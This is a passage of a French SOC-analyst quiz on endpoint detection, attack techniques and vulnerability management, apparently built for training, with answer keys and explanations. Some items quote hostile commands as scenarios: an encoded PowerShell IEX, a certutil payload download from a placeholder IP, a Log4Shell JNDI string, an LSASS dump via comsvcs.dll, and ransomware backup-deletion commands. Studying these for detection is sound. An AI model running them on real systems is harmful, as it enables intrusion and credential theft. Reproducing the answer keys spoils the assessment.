- **D.** L'absence totale de console centrale.

**Réponse correcte : B**

> **Explication technique :** L'antivirus classique repose principalement sur les signatures. L'EDR (CrowdStrike Falcon, Defender for Endpoint, SentinelOne) collecte en continu processus, fichiers, registre et réseau, détecte des comportements, et permet l'isolation, l'arrêt de processus, la collecte d'artefacts et le threat hunting.
>
> *Compétence évaluée : Endpoint Security / EDR vs antivirus.*

### Question 115 – [Niveau : Fondamental]

Qu'apporte une approche XDR par rapport à un EDR seul ?

- **A.** Elle remplace intégralement le besoin de journaux.
- **B.** Elle supprime l'utilité des analystes SOC.
- **C.** Elle remplace l'EDR par un pare-feu de nouvelle génération qui analyse le trafic réseau de tous les terminaux et bloque les menaces.
- **D.** Elle corrèle endpoint, identité, messagerie, réseau et cloud pour une détection et une réponse unifiées.

**Réponse correcte : D**

> **Explication technique :** L'XDR (Extended Detection and Response) étend la détection au-delà de l'endpoint. Microsoft Defender XDR, par exemple, relie un e-mail de phishing, le clic de l'utilisateur, l'exécution sur le poste et l'utilisation suspecte du compte dans un même incident.
>
> *Compétence évaluée : Endpoint Security / XDR.*

### Question 116 – [Niveau : Fondamental]

Quelle clé de registre est couramment utilisée par les malwares pour s'exécuter à chaque ouverture de session de l'utilisateur ?

- **A.** HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
- **B.** HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts
- **C.** HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- **D.** HKCU\Control Panel\Desktop\Wallpaper

**Réponse correcte : C**

> **Explication technique :** Les clés Run et RunOnce (dans HKCU et HKLM) lancent des programmes au démarrage de session (T1547.001). Elles sont surveillées par Sysmon (Event ID 13 pour les modifications de valeurs) et par les outils comme Autoruns de Sysinternals.
>
> *Compétence évaluée : Endpoint Security / Persistance.*

### Question 117 – [Niveau : Intermédiaire]

Un EDR remonte la commande : powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... Que faut-il en déduire ?

- **A.** Une commande Base64 (UTF-16LE) lancée sans profil et masquée : indicateur fort, à décoder pour analyse.
- **B.** Il s'agit d'une mise à jour Windows standard.
- **C.** La commande est chiffrée en AES avec une clé propre à la machine : elle ne peut pas être décodée et doit être soumise à l'éditeur de l'EDR.
- **D.** Il s'agit d'un script de connexion légitime toujours sans risque.

**Réponse correcte : A**

> **Explication technique :** -Enc (EncodedCommand) attend du Base64 encodé en UTF-16LE ; « SQBFAFgA » se décode en « IEX », typique d'un téléchargement et d'une exécution en mémoire. -NoP (NoProfile) et -W Hidden (WindowStyle Hidden) sont souvent associés à l'abus de PowerShell (T1059.001). Le décodage peut être fait avec CyberChef.
>
> *Compétence évaluée : Endpoint Security / PowerShell encodé.*

### Question 118 – [Niveau : Intermédiaire]

Quel journal permet de récupérer le contenu réel des scripts PowerShell exécutés, y compris après désobfuscation ?

- **A.** L'Event ID 4624 du journal Security.
- **B.** Le Script Block Logging (Event ID 4104, journal PowerShell/Operational).
- **C.** L'Event ID 4688 du journal Security, qui contient le script complet exécuté.
- **D.** Le journal DNS Server.

**Réponse correcte : B**

> **Explication technique :** Le Script Block Logging enregistre les blocs de script au moment de leur exécution, souvent après désobfuscation, ce qui le rend très précieux. Le Module Logging (4103) et la transcription complètent la visibilité. Ces paramètres s'activent par GPO.
>
> *Compétence évaluée : Endpoint Security / PowerShell logging.*

### Question 119 – [Niveau : Intermédiaire]

L'EDR montre l'arbre de processus suivant : WINWORD.EXE → cmd.exe → powershell.exe → connexion réseau externe. Quelle est l'interprétation la plus probable ?

- **A.** Word a lancé son assistant de mise à jour, qui utilise cmd.exe et PowerShell pour télécharger les correctifs Office depuis le CDN Microsoft.
- **B.** Il s'agit du comportement normal de l'impression d'un document.
- **C.** Une macro malveillante d'un document Office a lancé un interpréteur de commandes pour télécharger une charge utile.
- **D.** Word vérifie la disponibilité d'une mise à jour orthographique.

**Réponse correcte : C**

> **Explication technique :** Une application Office n'a normalement pas à lancer cmd.exe ou powershell.exe. Cette relation parent-enfant anormale est un indicateur classique de phishing avec pièce jointe (T1566.001) et d'exécution par l'utilisateur (T1204.002). Les règles ASR de Defender peuvent bloquer la création de processus enfants par Office.
>
> *Compétence évaluée : Endpoint Security / Process tree.*

### Question 120 – [Niveau : Intermédiaire]

Un exécutable légitime et signé d'un éditeur connu est retrouvé dans C:\Users\Public\ avec une DLL non signée portant le nom d'une dépendance attendue. Quelle technique est probablement utilisée ?

- **A.** Le Kerberoasting.
- **B.** Le process hollowing, qui remplace en mémoire le code du binaire légitime par celui de la DLL.
- **C.** Le password spraying.
- **D.** Le DLL side-loading : un binaire légitime charge une DLL malveillante placée à côté de lui.

**Réponse correcte : D**

> **Explication technique :** Le DLL side-loading (T1574.002) consiste à placer un exécutable légitime à côté d'une DLL malveillante qu'il chargera. Cela permet de bénéficier de la réputation du binaire signé. Sysmon Event ID 7 (Image Loaded) permet de détecter le chargement de DLL non signées depuis des chemins inhabituels.
>
> *Compétence évaluée : Endpoint Security / DLL sideloading.*

### Question 121 – [Niveau : Intermédiaire]

Sysmon enregistre un Event ID 8 (CreateRemoteThread) où un processus inconnu crée un thread dans explorer.exe. Quelle technique est suspectée ?

- **A.** Une requête DNS vers un domaine légitime.
- **B.** L'injection de processus (process injection) pour exécuter du code dans le contexte d'un processus légitime.
- **C.** L'effacement des journaux de sécurité.
- **D.** Une élévation de privilèges par création d'un compte administrateur local caché depuis explorer.exe.

**Réponse correcte : B**

> **Explication technique :** La création d'un thread distant est une méthode classique d'injection (T1055). Le code malveillant s'exécute alors sous l'identité d'un processus de confiance, ce qui complique la détection. L'analyse mémoire (malfind) et la télémétrie EDR permettent de confirmer l'injection.
>
> *Compétence évaluée : Endpoint Security / Process injection.*

### Question 122 – [Niveau : Intermédiaire]

Un analyste observe la commande certutil.exe -urlcache -split -f http://198.51.100.7/a.txt C:\ProgramData\a.exe. Quelle conclusion tirer ?

- **A.** Un binaire Windows légitime (LOLBin) est détourné pour télécharger une charge utile depuis Internet.
- **B.** C'est une sauvegarde automatique de l'utilisateur.
- **C.** La commande vérifie l'intégrité d'un certificat TLS.
- **D.** Il s'agit d'une mise à jour légitime de la liste de révocation des certificats (CRL), certutil stockant le résultat dans ProgramData.

**Réponse correcte : A**

> **Explication technique :** Certutil est conçu pour gérer les certificats, mais son option -urlcache permet de télécharger des fichiers (T1105 – Ingress Tool Transfer). Les « Living off the Land Binaries » (référencés sur le projet LOLBAS) permettent d'éviter de déposer des outils suspects. La présence d'une IP brute et d'un .exe dans ProgramData renforce la suspicion.
>
> *Compétence évaluée : Endpoint Security / LOLBins.*

### Question 123 – [Niveau : Intermédiaire]

Quel Event ID du journal System Windows signale l'installation d'un nouveau service, souvent utilisée pour la persistance ou l'exécution à distance ?

- **A.** 4740.
- **B.** 4771.
- **C.** 7045.
- **D.** 5156.

**Réponse correcte : C**

> **Explication technique :** L'Event ID 7045 (« A service was installed in the system ») est un indicateur important : PsExec, certains outils de pentest et des malwares créent des services. L'équivalent dans le journal Security est 4697 lorsque l'audit est activé. 4740 correspond à un verrouillage de compte, 4771 à un échec de pré-authentification Kerberos et 5156 à une connexion autorisée par le pare-feu Windows.
>
> *Compétence évaluée : Endpoint Security / Services.*

### Question 124 – [Niveau : Intermédiaire]

Quelle activité relève de l'analyse statique d'un malware ?

- **A.** Surveiller les modifications du registre pendant son exécution.
- **B.** Capturer le trafic C2 généré par l'échantillon.
- **C.** Exécuter l'échantillon dans une sandbox isolée et observer ses connexions réseau, ses processus enfants et ses modifications du registre.
- **D.** Calculer ses hashs, extraire les chaînes de caractères et examiner les imports et l'en-tête PE sans l'exécuter.

**Réponse correcte : D**

> **Explication technique :** L'analyse statique examine le fichier sans l'exécuter : hashs, strings, imports (ex. VirtualAlloc, CreateRemoteThread), sections, entropie (packing), règles YARA. L'analyse dynamique exécute l'échantillon dans un environnement isolé pour observer son comportement.
>
> *Compétence évaluée : Malware Analysis / Analyse statique.*

### Question 125 – [Niveau : Intermédiaire]

Dans CrowdStrike Falcon, quelle fonctionnalité permet à un analyste d'exécuter des commandes sur un hôte à distance pour collecter des fichiers ou tuer un processus ?

- **A.** Real Time Response (RTR).
- **B.** Falcon Fusion (workflows SOAR).
- **C.** Falcon Discover.
- **D.** Falcon Spotlight.

**Réponse correcte : A**

> **Explication technique :** Real Time Response fournit un shell distant sécurisé sur l'hôte (commandes ls, get, kill, reg query, ainsi que des scripts selon les droits). Spotlight concerne la gestion des vulnérabilités et Discover l'inventaire des actifs et applications.
>
> *Compétence évaluée : Endpoint Security / CrowdStrike.*

### Question 126 – [Niveau : Avancé / Expert]

Un attaquant a chargé un driver vulnérable signé pour désactiver le capteur EDR (technique BYOVD). Quel signal le SOC doit-il surveiller en priorité ?

- **A.** L'augmentation des connexions RDP réussies et des échecs d'authentification sur le poste, qui précèdent systématiquement le chargement d'un driver.
- **B.** Le taux d'utilisation du processeur du SIEM.
- **C.** La modification du fond d'écran des utilisateurs.
- **D.** La perte de télémétrie d'un capteur EDR et le chargement de nouveaux drivers (Sysmon 6, 7045 kernel).

**Réponse correcte : D**

> **Explication technique :** Le « Bring Your Own Vulnerable Driver » (T1068, T1562.001) exploite des drivers signés mais vulnérables pour tuer les processus de sécurité depuis le noyau. La surveillance de l'état des capteurs et du chargement de drivers, et l'application de la liste de blocage des drivers vulnérables de Microsoft, sont des contre-mesures clés.
>
> *Compétence évaluée : Endpoint Security / Évasion EDR.*

### Question 127 – [Niveau : Avancé / Expert]

Le Script Block Logging révèle une commande PowerShell modifiant en mémoire la valeur « amsiInitFailed ». Quel est l'objectif de l'attaquant ?

- **A.** Mettre à jour le moteur de l'antivirus.
- **B.** Contourner l'AMSI (Antimalware Scan Interface) afin que les scripts malveillants suivants ne soient plus analysés par l'antivirus.
- **C.** Chiffrer les fichiers de l'utilisateur.
- **D.** Activer la journalisation avancée de PowerShell (transcription et Script Block Logging) pour faciliter le débogage de ses scripts.

**Réponse correcte : B**

> **Explication technique :** L'AMSI permet aux moteurs antimalware d'inspecter les scripts au moment de leur exécution. Forcer amsiInitFailed à vrai désactive cette inspection dans la session (T1562.001 – Impair Defenses). Sa détection dans les événements 4104 est un indicateur à haute fidélité.
>
> *Compétence évaluée : Endpoint Security / AMSI.*

### Question 128 – [Niveau : Avancé / Expert]

Sysmon enregistre des Event IDs 19, 20 et 21 sur un serveur. Quelle technique de persistance est en cause ?

- **A.** Une clé de registre Run modifiée.
- **B.** Un service Windows installé via sc.exe.
- **C.** Un abonnement aux événements WMI (filtre, consommateur et liaison) permettant d'exécuter du code lors d'un événement déclencheur.
- **D.** Une tâche planifiée créée via schtasks.exe, dont les étapes de création, de modification et d'exécution sont journalisées par Sysmon.

**Réponse correcte : C**

> **Explication technique :** Les Event IDs Sysmon 19 (WmiEventFilter), 20 (WmiEventConsumer) et 21 (WmiEventConsumerToFilter) tracent la création d'abonnements WMI permanents (T1546.003). Cette persistance sans fichier est discrète et fréquemment utilisée par des acteurs avancés.
>
> *Compétence évaluée : Endpoint Security / WMI persistence.*

### Question 129 – [Niveau : Avancé / Expert]

Un exécutable présente une section .text à entropie de 7,9, très peu d'imports (LoadLibraryA, GetProcAddress) et des chaînes illisibles. Quelle conclusion est la plus probable ?

- **A.** L'exécutable est un fichier texte renommé.
- **B.** Le fichier est un exécutable .NET légitime : l'entropie élevée et le faible nombre d'imports sont normaux pour du code managé compilé à la volée.
- **C.** Il s'agit nécessairement d'un pilote Windows signé.
- **D.** L'exécutable est probablement packé ou chiffré, et ses fonctionnalités réelles seront résolues dynamiquement à l'exécution.

**Réponse correcte : D**

> **Explication technique :** Une entropie proche de 8 indique des données compressées ou chiffrées. Un nombre minimal d'imports, limité au chargement dynamique d'API, est caractéristique des packers (UPX, packers personnalisés). L'analyse dynamique en sandbox ou le dépaquetage est nécessaire pour révéler le comportement.
>
> *Compétence évaluée : Malware Analysis / Packing.*

### Question 130 – [Niveau : Avancé / Expert]

Lequel de ces comportements est le plus spécifique d'une activité de ransomware pré-chiffrement ?

- **A.** L'installation d'une mise à jour de navigateur.
- **B.** Une ouverture de session interactive le matin.
- **C.** vssadmin, wbadmin delete catalog et bcdedit recoveryenabled no, puis l'arrêt des services de sauvegarde.
- **D.** Une augmentation du trafic DNS vers les serveurs Microsoft, suivie du téléchargement de mises à jour cumulatives et d'un redémarrage planifié.

**Réponse correcte : C**

> **Explication technique :** Les ransomwares désactivent les mécanismes de récupération (T1490) et arrêtent les services (T1489) pour libérer les fichiers verrouillés avant chiffrement. Une règle combinant ces commandes offre une détection précoce à haute fidélité permettant d'isoler l'hôte avant le chiffrement massif.
>
> *Compétence évaluée : Endpoint Security / Détection de comportement.*

## Module 7 – Vulnerability Management and Attack Techniques

### Question 131 – [Niveau : Fondamental]

Qu'est-ce qu'un identifiant CVE ?

- **A.** Un score de gravité de 0 à 10 calculé par le NIST pour chaque produit vulnérable.
- **B.** Un identifiant unique et public attribué à une vulnérabilité de sécurité connue.
- **C.** Une signature antivirale.
- **D.** Un correctif publié par l'éditeur.

**Réponse correcte : B**

> **Explication technique :** Le programme CVE (Common Vulnerabilities and Exposures), géré par MITRE et financé par la CISA, attribue des identifiants de la forme CVE-AAAA-NNNNN. Le score de gravité est fourni séparément par le CVSS, et la base NVD du NIST enrichit les CVE avec ce score et des références.
>
> *Compétence évaluée : Vulnerability Management / CVE.*

### Question 132 – [Niveau : Fondamental]

Selon CVSS v3.1, quelle plage de score correspond à une sévérité « Critique » ?

- **A.** 9,0 à 10,0.
- **B.** 4,0 à 6,9.
- **C.** 7,0 à 8,9.
- **D.** 0,1 à 3,9.

**Réponse correcte : A**

> **Explication technique :** Les plages qualitatives CVSS v3.x sont : Aucune (0,0), Faible (0,1–3,9), Moyenne (4,0–6,9), Élevée (7,0–8,9) et Critique (9,0–10,0). CVSS v4.0, publié en novembre 2023, conserve ces plages qualitatives tout en révisant les métriques.
>
> *Compétence évaluée : Vulnerability Management / CVSS.*

### Question 133 – [Niveau : Fondamental]

Quelle différence existe entre une attaque par brute force classique et une attaque par password spraying ?

- **A.** Le brute force n'utilise jamais de dictionnaire.
- **B.** Le password spraying teste des mots de passe déjà divulgués sur leurs comptes d'origine, le brute force teste des combinaisons aléatoires sur tous les comptes.
- **C.** Le brute force teste de nombreux mots de passe sur un compte, le password spraying teste quelques mots de passe courants sur de nombreux comptes.
- **D.** Il n'y a aucune différence entre les deux techniques.

**Réponse correcte : C**

> **Explication technique :** Le password spraying (T1110.003) évite le verrouillage des comptes en limitant le nombre d'essais par compte. Sa détection repose sur l'agrégation par IP source : de nombreux comptes différents en échec depuis une même source ou une même plage, sur une période donnée.
>
> *Compétence évaluée : Attack Techniques / Brute force.*

### Question 134 – [Niveau : Fondamental]

Quel enregistrement DNS permet de publier la politique indiquant aux serveurs destinataires comment traiter les e-mails échouant aux contrôles SPF et DKIM ?

- **A.** PTR.
- **B.** DMARC.
- **C.** CNAME.
- **D.** MX.

**Réponse correcte : B**

> **Explication technique :** DMARC (enregistrement TXT sur _dmarc.domaine) définit une politique (none, quarantine, reject) et le reporting, en s'appuyant sur les résultats SPF et DKIM et sur l'alignement avec le domaine du champ From. MX désigne les serveurs de messagerie, PTR la résolution inverse et CNAME un alias.
>
> *Compétence évaluée : Attack Techniques / Phishing.*

### Question 135 – [Niveau : Fondamental]

Dans la Cyber Kill Chain de Lockheed Martin, quelle phase suit immédiatement l'« Exploitation » ?

- **A.** L'Installation.
- **B.** La Livraison (Delivery).
- **C.** La Reconnaissance.
- **D.** L'Armement (Weaponization).

**Réponse correcte : A**

> **Explication technique :** Les sept phases sont : Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control et Actions on Objectives. Après l'exploitation d'une vulnérabilité, l'attaquant installe un mécanisme lui permettant de maintenir l'accès.
>
> *Compétence évaluée : Attack Techniques / Kill Chain.*

### Question 136 – [Niveau : Fondamental]

Quelle est la différence entre un scan de vulnérabilités authentifié et non authentifié ?

- **A.** Le scan non authentifié est toujours plus précis.
- **B.** Le scan non authentifié nécessite des droits d'administrateur de domaine.
- **C.** Le scan authentifié exploite automatiquement les vulnérabilités trouvées pour confirmer leur présence, ce qui le réserve aux environnements de test.
- **D.** Le scan authentifié inspecte configuration et versions installées : résultats plus complets et plus fiables.

**Réponse correcte : D**

> **Explication technique :** Un scan authentifié (credentialed) accède au registre, aux paquets installés et aux fichiers de configuration. Le scan non authentifié ne voit que ce qui est exposé sur le réseau, comme le ferait un attaquant externe. Les deux approches sont complémentaires.
>
> *Compétence évaluée : Vulnerability Management / Scan.*

### Question 137 – [Niveau : Intermédiaire]

Deux vulnérabilités sont détectées : l'une CVSS 9,8 sur un serveur de test isolé, l'autre CVSS 7,5 sur un serveur web exposé sur Internet et présente dans le catalogue CISA KEV. Laquelle traiter en priorité ?

- **A.** Les deux doivent attendre la prochaine fenêtre de maintenance annuelle.
- **B.** La vulnérabilité CVSS 9,8, car le score de base reflète le risque réel pour l'organisation et doit toujours déterminer l'ordre de correction.
- **C.** La vulnérabilité CVSS 7,5 du serveur exposé, car elle est activement exploitée et l'actif est accessible depuis Internet.
- **D.** Aucune, car les deux scores sont inférieurs à 10.

**Réponse correcte : C**

> **Explication technique :** La priorisation basée sur le risque combine la sévérité, l'exploitabilité réelle (KEV, EPSS), l'exposition et la criticité de l'actif. Une vulnérabilité exploitée sur un système exposé présente un risque bien supérieur à un score théorique élevé sur un système isolé.
>
> *Compétence évaluée : Vulnerability Management / Priorisation.*

### Question 138 – [Niveau : Intermédiaire]

Quelle information fournit l'EPSS (Exploit Prediction Scoring System) ?

- **A.** La liste des correctifs publiés par l'éditeur.
- **B.** La probabilité qu'une vulnérabilité soit exploitée dans les 30 prochains jours.
- **C.** La gravité technique intrinsèque d'une vulnérabilité, selon les métriques d'exploitabilité et d'impact.
- **D.** Le nombre d'actifs vulnérables dans l'entreprise.

**Réponse correcte : B**

> **Explication technique :** L'EPSS, maintenu par le FIRST, estime la probabilité d'exploitation à 30 jours à partir de données observées. Il complète le CVSS, qui mesure la sévérité, pour aider à concentrer les efforts de correction sur les vulnérabilités les plus susceptibles d'être exploitées.
>
> *Compétence évaluée : Vulnerability Management / EPSS.*

### Question 139 – [Niveau : Intermédiaire]

Sysmon Event ID 10 montre un processus rundll32.exe accédant à lsass.exe avec un GrantedAccess de 0x1FFFFF, la ligne de commande contenant comsvcs.dll MiniDump. Quelle technique est observée ?

- **A.** Le vol d'identifiants par dump de la mémoire de LSASS (T1003.001).
- **B.** Une découverte de partages réseau.
- **C.** Un scan réseau ARP.
- **D.** L'élévation de privilèges par contournement de l'UAC via rundll32.

**Réponse correcte : A**

> **Explication technique :** La fonction MiniDump de comsvcs.dll, appelée via rundll32, est une technique connue pour dumper LSASS sans outil externe. Le dump contient des hashs NTLM, voire des tickets Kerberos. Les contre-mesures incluent LSA Protection (RunAsPPL), Credential Guard et les règles ASR.
>
> *Compétence évaluée : Attack Techniques / Credential dumping.*

### Question 140 – [Niveau : Intermédiaire]

Un analyste observe de nombreux événements 4769 émis par un même utilisateur pour des comptes de service différents, avec un type de chiffrement 0x17. Quelle attaque est probable ?

- **A.** Une attaque pass-the-ticket utilisant des tickets TGS volés en mémoire pour accéder aux comptes de service, sans cassage de mot de passe.
- **B.** Un brute force sur le protocole RDP.
- **C.** Un Golden Ticket forgé avec le hash KRBTGT.
- **D.** Le Kerberoasting : demande de tickets de service chiffrés en RC4 afin de casser hors ligne le mot de passe des comptes de service.

**Réponse correcte : D**

> **Explication technique :** Le Kerberoasting (T1558.003) exploite le fait que tout utilisateur authentifié peut demander un ticket TGS pour un compte possédant un SPN. Le chiffrement RC4 (0x17) facilite le cassage hors ligne. Les contre-mesures incluent des mots de passe longs pour les comptes de service, les gMSA et l'imposition d'AES.
>
> *Compétence évaluée : Attack Techniques / Kerberoasting.*

### Question 141 – [Niveau : Intermédiaire]

Quel indicateur peut suggérer une attaque pass-the-hash dans les journaux Windows ?

- **A.** Un événement 6006 indiquant l'arrêt du journal d'événements.
- **B.** Des événements 4625 répétés avec le sous-statut 0xC000006A sur un même compte, suivis d'un événement 4740 de verrouillage.
- **C.** Des 4624 de type 3 en NTLM pour un compte privilégié, depuis un poste inhabituel et sans trace Kerberos.
- **D.** Un événement 1102 sur un poste utilisateur.

**Réponse correcte : C**

> **Explication technique :** Le pass-the-hash (T1550.002) réutilise un hash NTLM sans connaître le mot de passe. Une authentification NTLM réseau d'un compte administrateur depuis une machine inhabituelle, dans un environnement où Kerberos est la norme, est suspecte. Microsoft Defender for Identity propose des détections dédiées.
>
> *Compétence évaluée : Attack Techniques / Pass-the-Hash.*

### Question 142 – [Niveau : Intermédiaire]

Un attaquant découvre un service Windows exécuté en SYSTEM dont le chemin est C:\Program Files\App Folder\service.exe, sans guillemets, et constate qu'il peut écrire un fichier dans C:\Program Files\. Quelle vulnérabilité exploite-t-il ?

- **A.** Un chemin de service non entre guillemets (unquoted service path) permettant l'exécution d'un binaire malveillant avec les privilèges du service.
- **B.** Un défaut de configuration du DNS.
- **C.** Une injection SQL dans le service.
- **D.** Un détournement de l'ordre de recherche des DLL du service, qui charge une bibliothèque depuis le répertoire de travail de l'utilisateur.

**Réponse correcte : A**

> **Explication technique :** Si le chemin n'est pas entre guillemets et contient des espaces, Windows tente successivement C:\Program.exe, puis C:\Program Files\App.exe, etc. Un attaquant capable d'écrire à l'un de ces emplacements peut obtenir l'exécution avec les privilèges du service, souvent SYSTEM (T1574.009).
>
> *Compétence évaluée : Attack Techniques / Élévation de privilèges.*

### Question 143 – [Niveau : Intermédiaire]

Quel indicateur Windows est caractéristique d'une connexion RDP réussie sur un serveur ?

- **A.** Un événement 4625 avec un logon type 2.
- **B.** Un événement 4624 avec un logon type 10 (RemoteInteractive).
- **C.** Un événement 4624 avec un logon type 5 (Service).
- **D.** Un événement 4634 avec un logon type 4 (Batch).

**Réponse correcte : B**

> **Explication technique :** Le logon type 10 correspond aux sessions Terminal Services/RDP. Le type 2 est interactif local, le type 3 réseau, le type 4 batch (tâches planifiées), le type 5 service et le type 7 déverrouillage. Des connexions RDP de poste à poste ou depuis des comptes inhabituels sont des indicateurs de mouvement latéral (T1021.001).
>
> *Compétence évaluée : Attack Techniques / Mouvement latéral.*

### Question 144 – [Niveau : Intermédiaire]

Après un accès initial, un attaquant exécute whoami /all, net group "Domain Admins" /domain, nltest /dclist et ipconfig /all. Quelle tactique MITRE ATT&CK est illustrée ?

- **A.** Exfiltration (TA0010).
- **B.** Impact (TA0040).
- **C.** Initial Access (TA0001).
- **D.** Discovery (TA0007).

**Réponse correcte : D**

> **Explication technique :** Ces commandes servent à découvrir le contexte du compte, les groupes privilégiés, les contrôleurs de domaine et la configuration réseau. Leur exécution en rafale par un même processus en peu de temps est un indicateur de reconnaissance interne, souvent après un accès initial ou l'exécution d'un implant.
>
> *Compétence évaluée : Attack Techniques / Post-exploitation.*

### Question 145 – [Niveau : Intermédiaire]

Un utilisateur a saisi ses identifiants sur une page imitant Microsoft 365 ; malgré le MFA, l'attaquant accède à sa boîte aux lettres. Quelle technique explique ce contournement ?

- **A.** Un phishing Adversary-in-the-Middle (AiTM) qui relaie l'authentification et vole le cookie de session après la validation MFA.
- **B.** Un brute force du code MFA à 6 chiffres, rendu possible par l'absence de limitation du nombre de tentatives sur la page de connexion Microsoft.
- **C.** Un ARP spoofing sur le réseau domestique de l'utilisateur.
- **D.** Une attaque par injection SQL sur Entra ID.

**Réponse correcte : A**

> **Explication technique :** Les kits AiTM (Evilginx, EvilProxy, Tycoon 2FA) se placent en proxy entre l'utilisateur et le vrai service : l'utilisateur effectue réellement son MFA et l'attaquant capture le cookie de session (T1557, T1539). Les méthodes résistantes au phishing (FIDO2, Windows Hello) et les politiques de conformité des appareils réduisent ce risque.
>
> *Compétence évaluée : Attack Techniques / Phishing avancé.*

### Question 146 – [Niveau : Avancé / Expert]

Un événement 4662 sur un contrôleur de domaine montre un compte utilisateur standard effectuant une opération avec les droits « Replicating Directory Changes All » (GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2). Quelle attaque est suspectée ?

- **A.** Une mise à jour de stratégie de groupe.
- **B.** Une réplication normale déclenchée par un contrôleur de domaine en lecture seule (RODC), qui utilise des comptes utilisateurs pour se synchroniser.
- **C.** Une sauvegarde planifiée de l'Active Directory.
- **D.** Une attaque DCSync visant à récupérer les hashs des comptes du domaine, dont KRBTGT, en imitant un contrôleur de domaine.

**Réponse correcte : D**

> **Explication technique :** DCSync (T1003.006), notamment via Mimikatz lsadump::dcsync, utilise le protocole de réplication MS-DRSR. Une demande de réplication émanant d'un compte ou d'une machine qui n'est pas un contrôleur de domaine est hautement suspecte. Il faut vérifier les comptes disposant de ces droits et surveiller ces GUID.
>
> *Compétence évaluée : Attack Techniques / DCSync.*

### Question 147 – [Niveau : Avancé / Expert]

Placez dans l'ordre logique ATT&CK les observations suivantes : (1) dump LSASS, (2) e-mail avec pièce jointe ISO, (3) connexion RDP vers un serveur de fichiers avec un compte admin, (4) archivage 7z puis envoi vers un service cloud.

- **A.** 3, 4, 1, 2 : Lateral Movement, Exfiltration, Credential Access, Initial Access.
- **B.** 1, 2, 4, 3 : Credential Access, Initial Access, Exfiltration, Lateral Movement.
- **C.** 2, 1, 3, 4 : Initial Access, Credential Access, Lateral Movement, Exfiltration.
- **D.** 4, 3, 2, 1 : Exfiltration, Lateral Movement, Initial Access, Credential Access.

**Réponse correcte : C**

> **Explication technique :** Le scénario typique débute par l'accès initial (pièce jointe ISO, T1566.001), puis le vol d'identifiants (T1003.001), leur utilisation pour se déplacer (T1021.001) et enfin la collecte et l'exfiltration (T1560.001, T1567.002). Reconstituer cette chaîne aide à identifier les points de détection manqués.
>
> *Compétence évaluée : Attack Techniques / Chaîne d'attaque.*

### Question 148 – [Niveau : Avancé / Expert]

L'EDR détecte une modification de la clé HKCU\Software\Classes\ms-settings\Shell\Open\command suivie de l'exécution de fodhelper.exe, qui lance cmd.exe en niveau d'intégrité élevé. De quoi s'agit-il ?

- **A.** D'un déni de service sur le service Windows Update.
- **B.** D'un contournement de l'UAC (T1548.002) exploitant un binaire auto-élevé qui lit une clé de registre contrôlable par l'utilisateur.
- **C.** D'une attaque Kerberoasting.
- **D.** D'une configuration légitime des associations de fichiers de l'application Paramètres, qui s'exécute en intégrité élevée par conception.

**Réponse correcte : B**

> **Explication technique :** Fodhelper.exe est un binaire auto-élevé (autoElevate) qui consulte ms-settings dans HKCU. En y plaçant une commande, l'attaquant obtient une exécution en intégrité élevée sans invite UAC. La surveillance des modifications de cette clé (Sysmon 12/13) et de l'arbre de processus permet la détection.
>
> *Compétence évaluée : Attack Techniques / UAC bypass.*

### Question 149 – [Niveau : Avancé / Expert]

Les journaux d'un serveur web montrent une requête GET contenant ${jndi:ldap://203.0.113.50:1389/a} dans l'en-tête User-Agent, suivie d'une connexion LDAP sortante du serveur vers cette IP. Quelle conclusion est la plus juste ?

- **A.** Un comportement normal de la bibliothèque de journalisation.
- **B.** Un simple scan sans conséquence : la chaîne JNDI n'est interprétée que dans le corps d'une requête POST, jamais dans un en-tête HTTP.
- **C.** Une exploitation de Log4Shell probablement réussie, puisque le serveur a contacté l'infrastructure de l'attaquant.
- **D.** Une attaque par injection SQL ayant échoué.

**Réponse correcte : C**

> **Explication technique :** La chaîne ${jndi:ldap://...} est la signature de l'exploitation de Log4j. Une simple requête peut n'être qu'un scan, mais la connexion LDAP sortante du serveur démontre que la chaîne a été interprétée. Il faut traiter le serveur comme compromis : confinement, recherche de charges utiles et correction.
>
> *Compétence évaluée : Vulnerability Management / Exploitation d'application web.*

### Question 150 – [Niveau : Avancé / Expert]

Quelle différence permet de distinguer un Silver Ticket d'un Golden Ticket lors d'une investigation ?

- **A.** Le Silver Ticket est un TGS forgé avec le hash du compte de service : aucun 4769 n'apparaît sur le DC pour cet accès.
- **B.** Le Golden Ticket est limité à un seul service.
- **C.** Les deux attaques génèrent obligatoirement des événements 4625.
- **D.** Le Silver Ticket nécessite le hash du compte KRBTGT et génère des événements 4768 sur le contrôleur de domaine, ce qui le rend plus facile à détecter.

**Réponse correcte : A**

> **Explication technique :** Le Golden Ticket (T1558.001) est un TGT forgé avec le hash KRBTGT, donnant accès à tout le domaine. Le Silver Ticket (T1558.002) est un ticket de service forgé avec le hash du compte du service visé : il est présenté directement au service, ce qui le rend plus discret côté contrôleur de domaine. La détection repose alors sur les journaux du serveur cible et les anomalies de tickets (PAC, durées).
>
> *Compétence évaluée : Attack Techniques / Golden vs Silver Ticket.*

## Module 8 – Threat Hunting and Detection Engineering

### Question 151 – [Niveau : Fondamental]

Qu'est-ce que le threat hunting ?

- **A.** L'installation de correctifs de sécurité sur les serveurs.
- **B.** La rédaction des politiques de sécurité de l'entreprise.
- **C.** Le traitement approfondi des alertes générées par le SIEM et l'EDR, afin de confirmer les vrais positifs avant escalade au Tier 2.
- **D.** Une recherche proactive et itérative de menaces ayant échappé aux mécanismes de détection existants.

**Réponse correcte : D**

> **Explication technique :** Le threat hunting part du principe que l'organisation peut déjà être compromise (« assume breach »). Le hunter formule des hypothèses et explore les données pour trouver des traces d'activité malveillante non détectée. Les résultats alimentent de nouvelles règles de détection.
>
> *Compétence évaluée : Threat Hunting / Définition.*

### Question 152 – [Niveau : Fondamental]

Quelle formulation constitue une bonne hypothèse de threat hunting ?

- **A.** « Tous les utilisateurs sont malveillants. »
- **B.** « Un attaquant maintient sa persistance sur nos serveurs via des tâches planifiées pointant vers %APPDATA%. »
- **C.** « Nous sommes peut-être piratés. »
- **D.** « Nous devons analyser l'ensemble des journaux disponibles des six derniers mois afin d'identifier toute activité anormale, quelle qu'elle soit. »

**Réponse correcte : B**

